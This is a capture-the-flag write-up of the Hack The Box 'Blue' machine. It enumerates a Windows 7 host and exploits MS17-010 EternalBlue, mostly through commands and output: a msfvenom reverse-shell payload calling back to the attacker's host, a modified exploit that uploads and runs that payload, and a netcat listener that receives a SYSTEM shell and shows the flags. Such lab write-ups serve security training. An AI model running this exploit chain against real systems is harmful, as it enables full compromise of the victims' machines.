# Enumeration

```bash
┌──(root💀shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 12:44 +08
Nmap scan report for 10.10.10.40
Host is up (0.0037s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/9%OT=135%CT=1%CU=38266%PV=Y%DS=2%DC=T%G=Y%TM=620346E
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M5
OS:05NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-09T04:45:21
|_  start_date: 2022-02-09T04:43:42
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-09T04:45:22+00:00
|_clock-skew: mean: 3s, deviation: 2s, median: 2s

TRACEROUTE (using port 993/tcp)
HOP RTT     ADDRESS
1   3.98 ms 10.10.14.1
2   4.14 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.99 seconds
```

Hmm… it seems like there is no website for this challenge.

Let’s run `nmap` with `--scripts=vuln` to check for the possible vulnerabilities on the target machine.

```bash
┌──(root💀shiro)-[/home/shiro]
└─# nmap --script=vuln 10.10.10.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 12:46 +08
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.40
Host is up (0.0039s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 134.49 seconds

```

It seems like this machine is vulnerable to the infamous `MS17-010 EternalBlue`! 

# Exploitation

Let’s use `searchsploit` to search for any existing exploits.

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# searchsploit --id ms17-010
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  EDB-ID
------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote  | 43970
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)       | 41891
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)    | 42031
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Exe | 42315
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS | 42030
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution  | 41987
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# searchsploit -m 42315     
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable

Copied to: /home/shiro/HackTheBox/Blue/42315.py
```

Reading the source code shows that we need to download `mysmb.py` from this [link](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py).

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
--2022-02-09 13:08:13--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py [following]
--2022-02-09 13:08:13--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16669 (16K) [text/plain]
Saving to: ‘42315.py.1’

42315.py.1                    100%[===============================================>]  16.28K  --.-KB/s    in 0s      

2022-02-09 13:08:13 (220 MB/s) - ‘42315.py.1’ saved [16669/16669]
                                                                
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# mv 42315.py.1 mysmb.py     
```

Looking further through the source code, it shows that we need a username and password… Perhaps, we can use `enum4linux` to enumerate some information from the Windows machine?

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# enum4linux -a 10.10.10.40


Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb  9 13:12:46 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.40
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

... [Other information that is not needed]


```

Let’s fill this information on the source code~

```bash
USERNAME = 'guest'
PASSWORD = ''
```

Now, we need to create a reverse shell payload using `msfvenom`!

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f exe > exploit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Thereafter, we need to adjust the following part of the source code:

```python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()

	print('creating file c:\\exploit.exe on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/exploit.exe')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)

	# Send reverse shell payload
	smb_send_file(smbConn, '/home/shiro/HackTheBox/Blue/exploit.exe', 'C', '/exploit.exe')
	# Execute the reverse shell payload
	service_exec(conn, r'cmd /c c:\exploit.exe')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```

Finally, we can spin up a netcat listener and execute the exploit!

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Blue]
└─# python 42315.py 10.10.10.40                                                       
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa80047a6020
SESSION: 0xfffff8a011e22de0
FLINK: 0xfffff8a008632088
InParam: 0xfffff8a00862015c
MID: 0x1207
unexpected alignment, diff: 0x11088
leak failed... try again
CONNECTION: 0xfffffa80047a6020
SESSION: 0xfffff8a011e22de0
FLINK: 0xfffff8a008289048
InParam: 0xfffff8a00863815c
MID: 0x1207
unexpected alignment, diff: 0x-3affb8
leak failed... try again
CONNECTION: 0xfffffa80047a6020
SESSION: 0xfffff8a011e22de0
FLINK: 0xfffff8a00864a088
InParam: 0xfffff8a00864415c
MID: 0x1203
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\exploit.exe on the target
Opening SVCManager on 10.10.10.40.....
Creating service cFsa.....
Starting service cFsa.....
The NETBIOS connection with the remote host timed out.
Removing service cFsa.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done

┌──(shiro㉿shiro)-[~]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.40] 49161
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\

09/02/2022  05:40            73,802 exploit.exe
14/07/2009  03:20    <DIR>          PerfLogs
24/12/2017  02:23    <DIR>          Program Files
14/07/2017  16:58    <DIR>          Program Files (x86)
09/02/2022  05:37                 0 pwned.txt
14/07/2017  13:48    <DIR>          Share
21/07/2017  06:56    <DIR>          Users
15/01/2021  10:42    <DIR>          Windows
               2 File(s)         73,802 bytes
               6 Dir(s)  17,256,787,968 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  17,256,787,968 bytes free

C:\Users>cd haris\Desktop
cd haris\Desktop

C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
21/07/2017  06:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  17,256,787,968 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75cbd71de245c8deea9

C:\Users\haris\Desktop>cd ..\..\Administrator\Desktop
cd ..\..\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
21/07/2017  06:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  17,256,169,472 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6c08843ce9df4e717
```

